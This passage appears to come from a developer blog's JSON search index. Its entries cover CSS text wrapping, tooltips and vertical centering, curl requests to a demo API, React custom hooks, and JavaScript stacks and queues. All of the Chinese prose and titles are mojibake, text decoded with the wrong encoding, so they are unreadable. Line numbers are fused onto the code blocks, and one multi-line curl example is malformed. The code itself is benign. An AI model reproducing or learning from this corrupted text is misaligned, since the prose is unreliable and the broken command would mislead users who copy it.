break-allï¼Œå› ç‚ºæœƒè…°æ–¬ï¼š ä½ å¯ä»¥æ”¹ç”¨ word-break: break-wordï¼Œå°±ä¸æœƒå‡ºç¾å–®å­—è¢«ç åŠçš„å•é¡Œï¼š ä¸æƒ³è¢«è‡ªå‹•æ›è¡Œè·Ÿå‰›å‰›ç›¸åï¼Œå¦‚æœç¾åœ¨æ–‡å­—æœ‰ç©ºç™½æˆ–æ›è¡Œï¼š 12345&lt;div class=\"box\"&gt; Hey Hello yo apple bananna verylongworld iwatch imac iphone iwatch imac iphone iwatch imac iphone &lt;/div&gt; é€™æ™‚å€™åˆä¸å¸Œæœ›è¢«è‡ªå‹•æ›è¡Œçš„è©±å¯ä»¥ä½¿ç”¨ white-space: nowrapï¼š","link":"/2022/01/12/css-text-problem/"},{"title":"CSS Tooltip æ‡¶äººåŒ…","text":"æ¯æ¬¡éƒ½è¦é‡è®€ code æœ‰é»ç…©ï¼Œæ‰€ä»¥ç›´æ¥å¯«åœ¨é€™è£¡ã€‚ ç°¡è¿°é€™é‚Šåªæœƒè²¼å¾€ä¸‹å½ˆå‡ºçš„ç‰ˆæœ¬ï¼Œå¦‚æœè¦å…¶ä»–æ–¹å‘åƒè€ƒé€™è£¡ï¼Œç¨å¾®æ”¹ä¸€ä¸‹å°± OK äº†ã€‚ é hover çš„ç‰ˆæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061/* å‹•ç•« */@keyframes tooltips-vert { to { opacity: 0.9; transform: translate(-50%, 0); }}/* æœ¬é«” */[tooltip] { position: relative;}/* è¨Šæ¯æ¡†è·Ÿä¸‰è§’å½¢ */[tooltip]::before,[tooltip]::after { font-size: 0.9em; line-height: 1; user-select: none; pointer-events: none; position: absolute; opacity: 0; animation: tooltips-vert 300ms ease-out forwards;}/* ä¸‰è§’å½¢ */[tooltip]::before { content: \"\"; border: 5px solid transparent; z-index: 1001;}/* è¨Šæ¯æ¡† */[tooltip]::after { content: attr(tooltip); font-family: Helvetica, sans-serif; text-align: center; min-width: 3em; max-width: 21em; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; padding: 1ch 1.5ch; border-radius: 0.3ch; box-shadow: 0 1em 2em -0.5em rgba(0, 0, 0, 0.35); background-color: #333; color: #fff; z-index: 1000;}/* æ”¾åˆ°æ­£ä¸‹æ–¹ */[tooltip]::before { top: 100%; border-top-width: 0; border-bottom-color: #333;}/* æ­£ä¸‹æ–¹ + ä¸‰è§’å½¢çš„é«˜åº¦ */[tooltip]::after { top: calc(100% + 5px);}/* æ°´å¹³ç½®ä¸­ */[tooltip]::before,[tooltip]::after { left: 50%; transform: translate(-50%, 0.5em);} hover ç‰ˆæœ¬ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071@keyframes tooltips-vert { to { opacity: 0.9; transform: translate(-50%, 0); }}/* æœ¬é«” */[tooltip] { position: relative;}/* è¨Šæ¯æ¡†è·Ÿä¸‰è§’å½¢ */[tooltip]::before,[tooltip]::after { /* ä¸€é–‹å§‹å…ˆè—èµ·ä¾† */ display: none; font-size: 0.9em; line-height: 1; user-select: none; pointer-events: none; position: absolute; opacity: 0;}/* ä¸‰è§’å½¢ */[tooltip]::before { content: \"\"; border: 5px solid transparent; z-index: 1001;}/* è¨Šæ¯æ¡† */[tooltip]::after { content: attr(tooltip); font-family: Helvetica, sans-serif; text-align: center; min-width: 3em; max-width: 21em; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; padding: 1ch 1.5ch; border-radius: 0.3ch; box-shadow: 0 1em 2em -0.5em rgba(0, 0, 0, 0.35); background-color: #333; color: #fff; z-index: 1000;}/* æ”¾åˆ°æ­£ä¸‹æ–¹ */[tooltip]::before { top: 100%; border-top-width: 0; border-bottom-color: #333;}/* æ­£ä¸‹æ–¹ + ä¸‰è§’å½¢çš„é«˜åº¦ */[tooltip]::after { top: calc(100% + 5px);}/* æ°´å¹³ç½®ä¸­ */[tooltip]::before,[tooltip]::after { left: 50%; transform: translate(-50%, 0.5em);}/* hover æ™‚æ‰ç§€å‡ºä¾† */[tooltip]:hover::before,[tooltip]:hover::after { display: block;}/* :hover æ™‚åŠ å…¥å‹•ç•« */[tooltip]:hover::before,[tooltip]:hover::after { animation: tooltips-vert 300ms ease-out forwards;}","link":"/2022/02/24/css-tooltip/"},{"title":"æ›´å½ˆæ€§åŒ–çš„æ–‡å­—è¨­å®šï¼Œmax-width èˆ‡ max-height","text":"è¨­è¨ˆæ˜¯ä¸€é–€å­¸å•ã€‚ ä½¿ç”¨æ–¹å¼ç•¶å€å¡Šéå¤§æˆ–éå°æ™‚ï¼Œæ–‡å­—å¯èƒ½æœƒè¢«æ‹‰çš„å¾ˆé•·æˆ–å¾ˆçŸ­ï¼Œå¾ˆé›£çœ‹ã€‚é€™æ™‚å€™å¯ä»¥å–„ç”¨ max-width èˆ‡ max-height ä¾†è§£æ±ºï¼Œåƒè€ƒä¸‹é¢çš„åœ–ï¼š ğŸ’¡ è¨»ï¼šé€™æ˜¯æˆ‘åƒåŠ  Frontend Mentor æŒ‘æˆ°ä¸­çš„ç¯„ä¾‹ï¼Œæœ‰èˆˆè¶£çš„è©±å¯ä»¥åƒè€ƒä¸€ä¸‹ã€‚ ç¯„ä¾‹ä¸€ï¼š ç¯„ä¾‹äºŒï¼š","link":"/2022/01/16/css-trick-flexible-text/"},{"title":"CSS å‚ç›´ç½®ä¸­","text":"æœ€ç¶“å…¸çš„é¡Œç›®ä¹‹ä¸€ï¼Ÿ line-height å–®è¡Œæ–‡å­—åŸç†æ˜¯åˆ©ç”¨è¡Œé«˜ä¾†æŠŠæ–‡å­—æ¨åˆ°ä¸­é–“ï¼š 12345.box { width: 200px; height: 200px; line-height: 200px;} ç¼ºé»æ˜¯åªé©ç”¨æ–¼ã€Œä¸€è¡Œæ–‡å­—ã€ã€‚ line-height å¤šè¡Œæ–‡å­—éœ€æ­é…å¦å¤–å…©å€‹å±¬æ€§ï¼š inline-block vetical-align line-height å…¶å¯¦ä¸åƒ…é™æ–¼æ–‡å­—ï¼Œå®ƒå¯ä»¥é©ç”¨æ‰€æœ‰ã€Œinline-levelã€çš„å…ƒç´ ï¼Œæ‰€ä»¥åªè¦æŠŠå…§å®¹ç”¨ã€Œä¸€å€‹ç›’å­ã€åŒ…èµ·ä¾†å°±å¥½ï¼š HTMLï¼š 123456&lt;div class=\"box\"&gt; &lt;div class=\"content\"&gt; Lorem ipsum dolor sit amet consectetur adipisicing elit. Dignissimos ad quo ipsam! Dolor &lt;/div&gt; &lt;/div&gt; CSSï¼š 12345678910111213.box { margin: auto; width: 200px; line-height: 200px; text-align: center; background-color: orange;}.content { display: inline-block; /* line-height æœƒç¹¼æ‰¿ï¼Œæ‰€ä»¥é€™è£¡è¦åˆå§‹åŒ– */ line-height: 1; vertical-align: middle;} ç¼ºé»æ˜¯å…§å®¹åªèƒ½æ˜¯ inline-level å…ƒç´ ï¼Œç„¶å¾Œæ¯”è¼ƒä¸ç›´è¦ºä¸€é»ã€‚ paddingåˆ©ç”¨ padding ä¾†æ’é–‹é«˜åº¦ï¼š 12345.box { width: 200px; height: 200px; padding: 30px 0;} ç¼ºé»æ˜¯é€™æ¨£å°±æ²’è¾¦æ³•è¨­å®šé«˜åº¦ã€‚ absolute + transformæˆ‘å¾ˆå¸¸ç”¨çš„åšæ³•ã€‚ åŸç†æ˜¯ç”¨ absolute æŠŠè·é›¢è¨­ç‚ºé›¢åƒè€ƒé» 1/2 çš„å¯¬é«˜è·é›¢ï¼Œæ¥è‘—ç”¨ translate è®“å…ƒç´ å¾€å·¦ä¸Šæ–¹åç§»è‡ªèº« 1/2 çš„å¯¬é«˜ï¼š 12345678.box { width: 200px; height: 200px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);} æš«æ™‚æƒ³ä¸åˆ°æœ‰ä»€éº¼ç¼ºé»ï¼Œç¡¬è¦èªªçš„è©±å°±æ˜¯ Code æ¯”è¼ƒå¤šå§ã€‚ absolute + margin autoæœ‰æ™‚å€™æœƒç”¨åˆ°çš„åšæ³•ã€‚ åŸç†æ˜¯åˆ©ç”¨ top bottom left right ä¾†è¨­å®šå…ƒç´ çš„ã€Œå¯ç”¨ç©ºé–“ã€ï¼Œå†åŠ ä¸Š margin:auto è‡ªå‹•åˆ†é…ã€Œå‰©é¤˜ç©ºé–“ã€çš„ç‰¹æ€§ä¾†é”æˆï¼š 12345678910.box { position: absolute; top: 0; left: 0; right: 0; bottom: 0; margin: auto; width: 200px; height: 100px;} ç¼ºé»æ˜¯å…ƒç´ å¿…é ˆè¨­å®šå›ºå®šçš„å¯¬é«˜ï¼ˆ% ä¹Ÿ okï¼‰æ‰æœ‰æ•ˆã€‚ Flex + align itemsFlex å¥½æ£’æ£’ï¼ 12345678910.box { width: 300px; height: 300px; padding: 0px 30px; margin: auto; background-color: orange; /* é‡é»æ˜¯é€™å…©è¡Œ */ display: flex; align-items: center;} Flex + margin autoFlex ç›’å­æ§‹é€ è·Ÿä¸€èˆ¬äººä¸å¤ªä¸€æ¨£ï¼Œæ‰€ä»¥åªè¦å°å­å…ƒç´ è¨­å®š margin:auto å°±èƒ½é€éåˆ†é…ã€Œå‰©é¤˜ç©ºé–“ã€ä¾†é”åˆ°å‚ç›´ç½®ä¸­çš„æ•ˆæœã€‚ å‚™è¨»ï¼šå¯ä»¥å›æƒ³ absolute + margin çš„åŸç†ï¼Œé€™å€‹çš„åŸç†è·Ÿå®ƒå·®ä¸å¤šã€‚ HTMLï¼š 12345678&lt;div class=\"box\"&gt; &lt;div class=\"content\"&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Totam minus ea laudantium, corporis minima reprehenderit quis voluptatum quiiure! Aliquid, eligendi provident tempora deleniti tempore obcaecati at neque optio nobis. &lt;/div&gt;&lt;/div&gt; CSSï¼š 12345678910111213141516171819202122.box { box-sizing: border-box; width: 300px; height: 300px; background-color: orange; margin: auto; /* é‡é» */ display: flex;}.content { width: 200px; background-color: black; padding: 20px; color: white; /* é‡é»ï¼š è¨˜å¾—è¦è¨­å®šå¯¬åº¦ï¼Œ å°±è·Ÿ block è¦æœ‰å¯¬åº¦æ‰èƒ½æ­é… margin ä¾†ç½®ä¸­ä¸€æ¨£ */ width: 200px; margin: auto;} relative + calc()åªæ˜¯æƒ³ä»‹ç´¹ä¸€ä¸‹ calc() é€™å€‹å±¬æ€§ï¼Œå®ƒå¯ä»¥å°ä¸åŒå–®ä½åšè¨ˆç®—ï¼š 123456&lt;div class=\"box\"&gt; &lt;div class=\"content\"&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Totam minus ea laudantium, corporis minima reprehenderit quis voluptatum &lt;/div&gt;&lt;/div&gt; 1234567891011121314151617.box { width: 300px; height: 300px; background-color: orange; margin: auto;}.content { box-sizing: border-box; width: 200px; background-color: black; padding: 20px; color: white; /* é‡é» */ position: relative; top: calc((100% - 200px) / 2); height: 200px;} å‚™è¨»ï¼štop è·Ÿ bottom çš„ % æœƒç›¸å°æ–¼çˆ¶å±¤çš„ heightï¼Œleft è·Ÿ right çš„ % æœƒç›¸å°æ–¼ widthã€‚ ç°¡å–®èªªæ˜ä¸€ä¸‹åŸç†ï¼Œå…¶å¯¦é‡é»æ˜¯è¦ç®—å‡º ã€Œ.content è©²é›¢ä¸Šé¢å¤šå°‘è·é›¢ã€ã€‚ ä¸ç”¨æƒ³å¤ªè¤‡é›œå¾ˆç°¡å–®ï¼Œåªè¦çŸ¥é“ .content çš„é«˜åº¦å°±å¤ äº†ï¼Œç‚ºä»€éº¼ï¼Ÿå› ç‚ºåªè¦çŸ¥é“ã€Œå¯ç”¨ç©ºé–“ã€æœ‰å¤šå¤§ï¼Œå†æŠŠã€Œå¯ç”¨ç©ºé–“ / 2ã€å°±æ˜¯ç­”æ¡ˆäº†ã€‚ï¼ˆæŠŠç©ºé–“åˆ†é…åˆ°å·¦å³é‚Šï¼Œå…ƒç´ ä¸å°±åœ¨ä¸­é–“äº†å—ï¼Ÿï¼‰ é‚£è¦æ€éº¼çŸ¥é“ã€Œå¯ç”¨ç©ºé–“ã€æœ‰å¤šå°‘ï¼Ÿ =&gt; calc((100% - 200px)) é€™å€‹ç¿»æˆç™½è©±å°±æ˜¯ã€Œ.box çš„é«˜åº¦ - .content çš„é«˜åº¦ï¼‰ã€ï¼Œæ‰€ä»¥æœ€å¾Œé™¤ä»¥äºŒå°±æ˜¯æ­£ç¢ºçš„è·é›¢äº†ã€‚","link":"/2022/01/13/css-vertical-align-center/"},{"title":"curl çš„ä½¿ç”¨æ–¹æ³•","text":"é™¤äº†ç”¨ JavaScript çš„æ–¹å¼ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨ Terminal ä¾†ç™¼ requestï¼Œå¦å¤–ä¹Ÿç­†è¨˜ä¸€ä¸‹ curl æŒ‡ä»¤çš„ä¸€äº›ç”¨æ³•ã€‚ curl çš„åŸºæœ¬æ ¼å¼åŸºæœ¬ä¸Šéƒ½æ˜¯ä»¥é€™å€‹æ ¼å¼ï¼šcurl -H -X GET [options] [URL] ä¾†ç™¼å‡º requestã€‚ -H --header =&gt; å¯« header ç›¸é—œçš„è³‡è¨Š -X --request =&gt; è¦ä½¿ç”¨ HTTP çš„å“ªå€‹æ–¹æ³•ï¼Œé è¨­æ˜¯ GET -d --data =&gt; [options] çš„å…¶ä¸­ä¹‹ä¸€ï¼Œä»£è¡¨è¦ç™¼å‡º content-type: application/x-www-form-urlencoded çš„ POST è«‹æ±‚ -F --form =&gt; [options] çš„å…¶ä¸­ä¹‹ä¸€ï¼Œä»£è¡¨è¦é€å‡º content-type: multipart/form-data çš„ POST è«‹æ±‚ æ¥ä¸‹ä¾†æœƒä»¥ reqres é€™å€‹ API ä¾†åšé»ç¤ºç¯„ã€‚ GET1curl -X GET https://reqres.in/api/users/2 é è¨­å°±æ˜¯ GETï¼Œæ‰€ä»¥çœç•¥ -X GET ä¹Ÿå¯ä»¥ã€‚ POSTç™¼å‡º content-type: application/x-www-form-urlencoded çš„è«‹æ±‚ï¼š 1curl -X POST -d 'name=PeaNu' -d 'job=F2E' https://reqres.in/api/users/2 ç™¼å‡º content-type: multipart/form-data çš„è«‹æ±‚ï¼š 1curl -X POST -F 'name=PeaNu' -F 'job=F2E' https://reqres.in/api/users/2 -X POST å¯ä»¥çœç•¥ï¼Œå› ç‚ºæœ‰å¸¶ -dã€-F åƒæ•¸å°±èƒ½ç›´æ¥çŸ¥é“æ˜¯ä¸€å€‹ POST è«‹æ±‚ å¦‚æœè¦å‚³é JSON æ ¼å¼çš„è³‡æ–™å¯ä»¥é€™æ¨£åšï¼š 1curl -H \"Content-Type: application/json\" -X POST -d '{\"name\": \"PeaNu\", \"job\": \"F2E\"}' https://reqres.in/api/users/2 å¦‚æœæƒ³å¯«æˆæ›è¡Œçš„å½¢å¼å¯ä»¥åŠ ä¸Š \\ï¼š 123curl -X POST -H \"Content-Type: application/json\" \\ -data {\"name\": \"PeaNu\", \"job\": \"F2E\"} \\ https://reqres.in/api/users/2 DELETE1curl -i -X DELETE https://reqres.in/api/users/2 åŠ ä¸Š -i æ‰å¯ä»¥çœ‹åˆ°å›æ‡‰çš„ header PATCH1curl -X PATCH -F 'name=PeaNu' -F 'job=F2E' https://reqres.in/api/users/2","link":"/2022/01/04/curl-usage/"},{"title":"ä½¿ç”¨ custom hook æ™‚è¦æ³¨æ„çš„äº‹æƒ…","text":"å¾ˆæ„›æ‰å¼„äººçš„ referenceã€‚ ç°¡è¿°é€™å€‹è§€å¿µèªªé›£ä¸é›£ï¼Œä½†å¦‚æœæ²’æ³¨æ„çš„è©±æœƒå¾ˆå®¹æ˜“ç–å¿½æ‰ï¼Œæ‰€ä»¥æ‰ç‰¹åˆ¥é–‹ä¸€ç¯‡ä¾†ç´€éŒ„ä¸€ä¸‹ã€‚ å‡è¨­æˆ‘æœ‰ä¸€å€‹ custom hook æ˜¯ç”¨ä¾†è™•ç† request çš„ï¼Œé•·é€™æ¨£ï¼š 123456789101112131415161718import { useState, useEffect } from \"react\"export const useFetch = (url) =&gt; { const [data, setData] = useState(null) const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) useEffect(() =&gt; { const fetchData = async () =&gt; { const res = await fetch(url) const json = await res.json() setData(json) } fetchData() }, [url]) return { data, isPending, error }} é€™é‚Šæƒ³èªªçš„æ˜¯ï¼ŒuseEffect åªè¦ç”¨äº†å¤–éƒ¨çš„è®Šæ•¸æˆ– stateï¼Œå°±æœƒè¦ä½ æŠŠå®ƒå€‘æ”¾åˆ° dependencies ä¸­ï¼Œå¥½è®“å€¼è¢«æ›´æ–°æ™‚èƒ½å¤ é‡æ–°åŸ·è¡Œä¸€æ¬¡ Effectã€‚ åœ¨ä½¿ç”¨ä¸Šé¢çš„ custom hook æ™‚éœ€è¦å‚³å…¥ urlï¼Œä¾†åŸ·è¡Œä¸åŒçš„ requestï¼Œæ‰€ä»¥æŠŠ url æ”¾åˆ° dependencies åˆæƒ…åˆç†ï¼Œä¹Ÿæ²’æœ‰ä»»ä½•å•é¡Œã€‚ ä½†è«‹æ³¨æ„ï¼Œé€™æ˜¯å»ºç«‹åœ¨ï¼š ç•¶åƒæ•¸ä¸æ˜¯ referece typeï¼ˆnon-primitiveï¼‰ã€çš„æƒ…æ³ä¸‹æ‰ç®—æ•¸ ç•¶åƒæ•¸ä¸æ˜¯ referece typeï¼ˆnon-primitiveï¼‰ã€çš„æƒ…æ³ä¸‹æ‰ç®—æ•¸ ç•¶åƒæ•¸ä¸æ˜¯ referece typeï¼ˆnon-primitiveï¼‰ã€çš„æƒ…æ³ä¸‹æ‰ç®—æ•¸ æ€éº¼èªªï¼Ÿ ä½ å¯ä»¥è©¦è‘—åŠ å…¥ä¸€å€‹ option åƒæ•¸ï¼Œç”¨ Object çš„å½¢å¼å‚³é€²å»ï¼Œçœ‹çœ‹æœƒç™¼ç”Ÿä»€éº¼äº‹ï¼š 1234567function App () { const [url, setUrl] = useState('https://example.com') const { data, isPending, error } = useFetch(url, { type: 'GET' }) ... ... ...} 1234567891011121314151617181920import { useState, useEffect, useRef } from \"react\"export const useFetch = (url, options) =&gt; { const [data, setData] = useState(null) const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) useEffect(() =&gt; { // é€™é‚ŠåªæŠŠå€¼å°å‡ºä¾†ï¼Œä¸åšå…¶ä»–äº‹ console.log(options) const fetchData = async () =&gt; { const res = await fetch(url) const json = await res.json() setData(json) } fetchData() }, [url, options]) // æ”¾åˆ° dependencies return { data, isPending, error }} æŒ‰ä¸‹å­˜æª”å¾Œï¼Œæ­å–œä½ åˆé™·å…¥ç„¡é™è¿´åœˆäº†ã€‚ ç‚ºä»€éº¼å‰é¢ç‰¹åˆ¥å¼·èª¿åƒæ•¸ä¸å¯ä»¥ reference typeï¼Ÿå°±æ˜¯å› ç‚ºé€™æ¨£ï¼Œæ¯ä¸€æ¬¡åŸ·è¡Œ custom hook æ™‚éƒ½æœƒé‡æ–°å®£å‘Šä¸€å€‹æ–°çš„ Objectï¼Œé‡æ–°å®£å‘Šä»£è¡¨ä»€éº¼ï¼Ÿè©¦è‘—æ€è€ƒ {} === {} æœƒå¾—åˆ°ä»€éº¼ï¼Ÿ æ²’æœ‰éŒ¯ï¼Œåªæœƒæ˜¯ falseã€‚ æ‰€ä»¥åªè¦æ˜¯ reference type çš„è®Šæ•¸éƒ½è¦ç‰¹åˆ¥æ³¨æ„ï¼Œä½ ä¸å¯ä»¥ç›´æ¥é€™æ¨£å‚³çµ¦ custom hookï¼Œæ¥è‘—åˆæŠŠå®ƒæ”¾åˆ° dependencies è£¡ã€‚ æ­£ç¢ºçš„åšæ³•å¦‚æœæƒ³é¿å…æ‰é€™ç¨®é™·å…¥ç„¡é™è¿´åœˆçš„å•é¡Œï¼Œä½ æœ‰å…©ç¨®é¸æ“‡ï¼š æŠŠè¦ã€Œå‚³å…¥ã€çš„åƒæ•¸ç”¨ useState ä¾†å„²å­˜ æŠŠè¦ã€Œæ¥æ”¶ã€çš„åƒæ•¸ç”¨ useRef ä¾†å„²å­˜ å…ˆä¾†çœ‹ç¬¬ä¸€ç¨®ä½œæ³•ï¼š 1234567891011export default function App() { const [url, setUrl] = useState('https://example.com') // å»ºç«‹ state const [optios, setOptions] = useState({type: 'GET'}) // å‚³é€²å» const { data, isPending, error } = useFetch(url, optios) ... ... ...} åˆ©ç”¨ state æ˜¯ Immutable çš„ç‰¹æ€§ä¾†å­˜ç‹€æ…‹å°±å¯ä»¥é¿å…æ‰ä¸åŒ reference çš„å•é¡Œã€‚ æ¥è‘—æ˜¯ç¬¬äºŒç¨®ä½œæ³•ï¼š 123456789101112131415161718192021import { useState, useEffect, useRef } from \"react\"export const useFetch = (url, _options) =&gt; { const [data, setData] = useState(null) const [isPending, setIsPending] = useState(false) const [error, setError] = useState(null) // æ”¹ç”¨ useRef ä¾†å„²å­˜ const options = useRef(_options).current useEffect(() =&gt; { console.log(options) const fetchData = async () =&gt; { const res = await fetch(url) const json = await res.json() setData(json) } fetchData() }, [url, options]) return { data, isPending, error }} è·Ÿå‰›å‰›çš„é“ç†ä¸€æ¨£ï¼Œåˆ©ç”¨ useRef ä¸æœƒåœ¨ re-render æ™‚è¢«é‡æ–°å®£å‘Šçš„ç‰¹æ€§ï¼Œå°±èƒ½é¿å…ä¸åŒ reference çš„å•é¡Œã€‚ ç¸½ä¹‹ä½¿ç”¨ custom hook æ™‚ä¸€å®šè¦ç‰¹åˆ¥æ³¨æ„ reference çš„å•é¡Œï¼Œä¸ç„¶å¾ˆå®¹æ˜“é™·å…¥å¯æ€•çš„ç„¡çª®è¿´åœˆã€‚","link":"/2022/06/28/custom-hook-problem/"},{"title":"React å¯«ä¸€å€‹è‡ªå·±çš„ hookï¼","text":"é€™æ±è¥¿çœŸç¥å¥‡ã€‚ ç°¡è¿°å„˜ç®¡ React æœ‰æä¾›å„ç¨® hooks çµ¦å¤§å®¶ç”¨ï¼Œä½†ä½ é‚„å¯ä»¥é€²ä¸€æ­¥é€éé€™äº› hooks ä¾†åšå‡ºå°ˆå±¬æŸäº›ç”¨é€”çš„ hooksã€‚ ä¾‹å¦‚æˆ‘æƒ³åšä¸€å€‹å°ˆé–€è™•ç† input è¼¸å…¥çš„ hookï¼Œå…§å®¹å¯èƒ½å°±æœƒé•·é€™æ¨£ï¼š 12345678910111213// useInput.jsimport { useState } from \"react\";// export å‡ºå»export function useInput (deault = null) { const [inputValue, setInputValue] = useState(deault); // input çš„æ™‚å€™æœƒæŠŠå€¼æ›´æ–°ç‚ºç•¶å‰çš„ value const handleInput = (e) =&gt; { setInputValue(e.target.value); }; // function çš„å›å‚³å€¼æ˜¯ä¸‰å€‹æ±è¥¿ return { inputValue, setInputValue, handleInput } } æ¥è‘—åœ¨ Component è£¡å°±å¯ä»¥ç›´æ¥æ‹¿ä¾†ç”¨ï¼š 12345678910111213141516171819202122232425262728import { useInput } from '../custom-hooks/useInput';function TodoHeader({ handleAddTodo }) { // ç¬¬ä¸€å€‹ input const { inputValue, setInputValue, handleInput } = useInput(); // ç¬¬äºŒå€‹ inputï¼Œå› ç‚ºè¦æœ‰å€‹å„è‡ªçš„ stateï¼Œæ‰€ä»¥å¾—é‡æ–°å‘½å const { inputValue: secondInputValue, setInputValue: secondSetInputValue, handleInput: secondHandleInput } = useInput(); // è¡¨å–®æäº¤çš„è™•ç†ï¼Œä¸ç”¨ç®¡ const handleSubmit = (e) =&gt; { e.preventDefault(); handleAddTodo(inputValue); setInputValue(\"\"); }; return ( &lt;TodoHeaderWrapper onSubmit={handleSubmit}&gt; &lt;TodoInputBlock&gt; // ç¬¬ä¸€å€‹ &lt;Input value={inputValue} onChange={handleInput}&gt;&lt;/Input&gt; // ç¬¬äºŒå€‹ &lt;Input value={secondInputValue} onChange={secondHandleInput}&gt;&lt;/Input&gt; &lt;BlueButton&gt;é€å‡º&lt;/BlueButton&gt; &lt;/TodoInputBlock&gt; &lt;/TodoHeaderWrapper&gt; );}export default TodoHeader; å‡ºä¾†çš„çµæœå°±æœƒåƒé€™æ¨£ï¼š é€™æ¨£å­çš„å¥½è™•æ˜¯å¯ä»¥æŠŠã€Œå…±åŒçš„é‚è¼¯ã€çµ¦æŠ½å‡ºä¾†ï¼Œä»¥åŠä¸ç”¨è·Ÿ UI ç¶åœ¨ä¸€èµ·ï¼Œç•¢ç«ŸèƒŒå¾Œçš„é‚è¼¯éƒ½æ˜¯ä¸€æ¨£çš„ã€‚ ç¸½ä¹‹ï¼Œé€™æ¨£æ–¹å¼å¯ä»¥è®“ä½ æŠŠã€ŒåŒä¸€å€‹é‚è¼¯ã€å¥—ç”¨åœ¨ã€Œä¸åŒçš„ UIã€ä¸Šï¼Œé€™æ˜¯æˆ‘è¦ºå¾—æœ€å¼·å¤§çš„åœ°æ–¹ã€‚ å¦‚æœæŠŠé€™å€‹ç™¼æ®åˆ°æ¥µè‡´çš„è©±ï¼Œç”šè‡³å¯ä»¥æŠŠæ•´å€‹åŠŸèƒ½æ‹†å‡ºå»ï¼Œè®Šå¾—åƒé€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930313233import TodoItem from \"./components/TodoItem\";import TodoHeader from \"./components/TodoHeader\";import { useTodos } from \"./custom-hooks/todos\"function App() { const { id, todos, setTodos, handleAddTodo, handleRemoveTodo, handleToggleTodoState, } = useTodos() return ( &lt;div&gt; &lt;TodoHeader handleAddTodo={handleAddTodo}&gt;&lt;/TodoHeader&gt; {todos.map((todo) =&gt; { return ( &lt;TodoItem key={todo.id} todo={todo} handleRemoveTodo={handleRemoveTodo} handleToggleTodoState={handleToggleTodoState} &gt;&lt;/TodoItem&gt; ); })} &lt;/div&gt; );}export default App; é€™æ˜¯ä¸€å€‹ todo list çš„ hookã€‚æ‰€æœ‰ç›¸é—œçš„é‚è¼¯éƒ½å¯«åœ¨ useTodos ä¸­äº†ã€‚ ç¾åœ¨ App åªéœ€è¦é—œæ³¨ UIï¼Œè·ŸæŠŠå°æ‡‰çš„æ–¹æ³•ï¼ˆhandleRemoveTodo ç­‰ç­‰é‚£äº›ï¼‰ç¶å®šå°æ‡‰çš„äº‹ä»¶è™•ç†å°±å¥½ï¼Œä¹¾ä¹¾æ·¨æ·¨ï¼","link":"/2022/04/08/custom-hook/"},{"title":"è³‡æ–™çµæ§‹ï¼Stack èˆ‡ Queue","text":"åšå€‹ç°¡çŸ­çš„ç­†è¨˜ã€‚ ç°¡è¿°è³‡æ–™çµæ§‹æœ‰å¾ˆå¤šç¨®ï¼Œæ¯”è¼ƒå¸¸è¦‹çš„æœ‰ï¼š Array é™£åˆ— Linked List éˆçµä¸²åˆ— Stack å †ç–Š Queue ä½‡åˆ— Tree æ¨¹ ç›®å‰åªå­¸æœƒ Arrayã€Stack å’Œ Queueï¼Œå…¶ä»–çš„ç­‰ä¹‹å¾Œå­¸æœƒå¾Œå†ä¾†è£œã€‚ æˆ‘è¦ºå¾—å­¸è³‡æ–™çµæ§‹çš„ç›®çš„åœ¨æ–¼ï¼šå¦‚ä½•æŒ‘é¸å‡ºæœ€é©åˆçš„è³‡æ–™çµæ§‹ï¼Œé€™å€‹æ‰æ˜¯æœ€é‡è¦çš„ã€‚ åƒ JavaScript çš„ Event loop å°±ç”¨åˆ°äº† Stack å’Œ Queue é€™å…©å€‹çµæ§‹ã€‚æˆ‘ä»¥å‰æ²’æƒ³éèƒŒå¾Œçš„åŸå› æ˜¯ä»€éº¼ï¼ŒåªçŸ¥é“é€™å°±æ˜¯æ§‹æˆ Event loop çš„è¦ç´ ï¼Œä¸€ç›´åˆ°äº†å­¸æœƒä»¥å¾Œï¼Œæ‰æ˜ç™½ç‚ºä»€éº¼è¦ç”¨é€™å…©å€‹æ±è¥¿ã€‚ Stack å°±è·Ÿç–Šè‡ªåŠ©é¤é¤ç›¤ä¸€æ¨£ï¼Œä¸€å±¤ä¸€å±¤ç–Šä¸Šå»ã€‚ æŒ‰ç…§é€™æ¨£çš„ç‰¹æ€§ï¼Œå¯ä»¥ç™¼ç¾ä¸€ä»¶äº‹ï¼šå¦‚æœè¦æ‹¿åˆ°æœ€ä¸‹é¢çš„é¤ç›¤ï¼Œå°±å¾—æŠŠä¸Šé¢çš„é¤ç›¤éƒ½å…ˆæ‹¿èµ·ä¾†ï¼Œé€™å€‹å°±æ˜¯ Stack æœ€é‡è¦çš„ç‰¹æ€§äº†ï¼Œä¿—ç¨±ã€ŒFirst In Last Outã€ã€‚ ç”¨ JS ä¾†å¯¦ä½œä¹Ÿå¾ˆç°¡å–®ï¼š 1234567891011121314151617181920class Stack { constructor () { this.stack = []; } push (item) { this.stack.push(item); return this.stack; } pop () { this.stack.pop(); return this.stack; }}const stack = new Stack();console.log(stack.push('A')); // [ 'A' ]console.log(stack.push('B')); // [ 'A', 'B' ]console.log(stack.push('C')); // [ 'A', 'B', 'C' ]console.log(stack.pop()); // [ 'A', 'B' ]console.log(stack.pop()); // [ 'A' ] Queue å°±æ˜¯æ’éšŠå›‰ï¼Œä¸æº–æ’éšŠã€‚ è·Ÿ Stack ç›¸åï¼Œæ’åœ¨æœ€å‰é¢çš„äººæœƒç¬¬ä¸€å€‹é›¢é–‹éšŠä¼ï¼Œæ‰€ä»¥æ˜¯ã€ŒFirst In First Outã€ã€‚ å¯¦ä½œæ–¹å¼ä¹Ÿä¸é›£ï¼š 1234567891011121314151617181920class Queue { constructor () { this.queue = []; } push (item) { this.queue.push(item); return this.queue; } shift () { this.queue.shift(); return this.queue; }}const queue = new Queue();console.log(queue.push('A')); // [ 'A' ]console.log(queue.push('B')); // [ 'A', 'B' ]console.log(queue.push('C')); // [ 'A', 'B', 